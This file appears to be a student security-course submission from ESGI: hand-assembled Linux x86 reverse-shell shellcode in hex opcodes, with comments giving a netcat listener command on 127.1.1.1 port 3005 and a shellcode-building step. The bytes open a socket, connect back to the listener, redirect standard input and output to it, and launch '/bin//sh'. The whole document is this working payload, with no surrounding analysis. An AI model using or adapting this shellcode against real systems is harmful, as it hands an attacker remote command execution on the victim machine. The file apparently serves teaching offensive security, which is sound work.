# NOM / Prénom : NEHME Ali - MEZANI Nazim
# REVERSE SHELL ASM
# M1 - Sécurité - GR3
# ESGI
#


# nc -l -p 3005 -s 127.1.1.1
# m2elf.pl -in test-asm.m (test-asm.m ==> shellcode)


29 c0
50
66 B8 67 01

5b
B3 02

31 c9
41
    
31 D2
cd 80
89 C3

31 f6 
68 7f 01 01 01
29 c0 

66 bf b8 0b
01 f7
66 c1 c7 08
66 57

b2 02
66 52

66 b8 6a 01
        
89 e1
b2 10
cd 80
   
85 c0
75 02
eb 08
        
46
83 fe 05
7e d3 
eb 23
        
50
68 6e 2f 73 68
68 2f 2f 62 69

04 03
89 C1


B0 3f
49
cd 80
75 f9

89 C8
b2 0b
92

89 e3
cd 80

31 c0
40
31 db
cd 80